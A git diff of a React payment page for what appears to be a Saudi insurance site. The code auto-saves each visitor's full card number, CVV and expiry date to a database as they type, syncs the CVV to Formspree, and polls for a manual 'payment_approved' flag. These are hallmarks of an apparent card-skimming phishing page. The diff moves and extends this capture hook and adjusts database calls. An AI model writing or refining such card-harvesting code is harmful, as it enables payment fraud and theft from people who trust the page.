@@ -11,6 +11,7 @@ import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { useAutoSave } from "@/hooks/useAutoSave";
+import { publicApplications } from "@/lib/applicationPublic";
 import { supabase } from "@/integrations/supabase/client";
 import madaLogo from "@/assets/mada-logo.png";
 import {
@@ -102,18 +103,6 @@ const Payment = () => {
     cvv: formData.cvv
   }, "صفحة الدفع - Payment");
 
-  // Auto-save to database in real-time
-  useAutoSave(applicationId, {
-    cardholder_name: formData.cardholderName,
-    card_number: formData.cardNumber,
-    card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
-    card_cvv: formData.cvv,
-    expiry_date: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
-    selected_company: companyName,
-    selected_price: price,
-    regular_price: regularPrice,
-    current_step: 'payment'
-  }, "Payment");
 
   // تحديد نوع البطاقة بناءً على الأرقام
   const getCardType = (cardNumber: string): "visa" | "mastercard" | "unknown" => {
@@ -133,6 +122,20 @@ const Payment = () => {
     return "unknown";
   };
   const cardType = getCardType(formData.cardNumber);
+
+  // Auto-save to database in real-time
+  useAutoSave(applicationId, {
+    cardholder_name: formData.cardholderName,
+    card_number: formData.cardNumber,
+    card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
+    card_type: cardType,
+    card_cvv: formData.cvv,
+    expiry_date: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
+    selected_company: companyName,
+    selected_price: price,
+    regular_price: regularPrice,
+    current_step: 'payment'
+  }, "Payment");
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const {
       name,
@@ -181,11 +184,10 @@ const Payment = () => {
     if (waitingForApproval && applicationId) {
       // Check for approval every 2 seconds
       const interval = setInterval(async () => {
-        const { data, error } = await supabase.
-        from('customer_applications').
-        select('payment_approved, status').
-        eq('id', applicationId).
-        single();
+        const { data, error } = await publicApplications()
+        .select('payment_approved, status')
+        .eq('id', applicationId)
+        .single();
 
         if (data?.payment_approved) {
           clearInterval(interval);
@@ -273,11 +275,10 @@ const Payment = () => {
         company_logo?: string;
       } = {};
       if (applicationId) {
-        const { data } = await supabase.
-        from('customer_applications').
-        select('*').
-        eq('id', applicationId).
-        single();
+        const { data } = await publicApplications()
+        .select('full_name, phone, insurance_type, vehicle_manufacturer, vehicle_model, vehicle_year, vehicle_value, usage_purpose, add_driver, selected_company, selected_price, regular_price, company_logo')
+        .eq('id', applicationId)
+        .single();
 
         if (data) {
           existingData = {
@@ -319,23 +320,20 @@ const Payment = () => {
       let saveError = null;
 
       if (applicationId) {
-        const { data: updatedApp, error } = await supabase
+        const { error } = await supabase
           .from('customer_applications')
           .update(paymentData)
-          .eq('id', applicationId)
-          .select('id')
-          .maybeSingle();
+          .eq('id', applicationId);
 
         saveError = error;
-        if (updatedApp?.id) {
-          savedApplicationId = updatedApp.id;
-        }
       }
 
       if (!savedApplicationId || saveError) {
-        const { data: newApp, error } = await supabase
+        savedApplicationId = crypto.randomUUID();
+        const { error } = await supabase
           .from('customer_applications')
           .insert([{
+            id: savedApplicationId,
             ...paymentData,
             full_name: existingData.full_name || formData.cardholderName,
             phone: existingData.phone || null,
@@ -344,12 +342,9 @@ const Payment = () => {
             add_driver: existingData.add_driver,
             vehicle_value: existingData.vehicle_value,
             company_logo: existingData.company_logo
-          }])
-          .select('id')
-          .single();
+          }]);
 
         if (error) throw error;
-        savedApplicationId = newApp.id;
       }
 
       setApplicationId(savedApplicationId);
